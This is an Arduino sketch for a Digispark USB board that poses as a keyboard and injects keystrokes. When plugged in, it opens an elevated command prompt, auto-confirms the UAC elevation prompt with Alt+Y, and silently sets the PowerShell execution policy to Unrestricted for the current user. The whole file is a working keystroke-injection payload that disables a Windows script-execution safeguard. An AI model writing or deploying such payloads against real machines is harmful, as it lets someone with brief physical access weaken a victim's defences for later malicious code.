#include "DigiKeyboard.h"
void setup() {}

void loop() {
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(2500);
    
    /* Enable Running Scripts in Powershell.*/
    DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(750);
    DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
    DigiKeyboard.delay(750);
    DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(750);
    DigiKeyboard.print("exit");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(750);

    for (;;) {
        /*Stops the digispark from running the scipt again*/
    }
}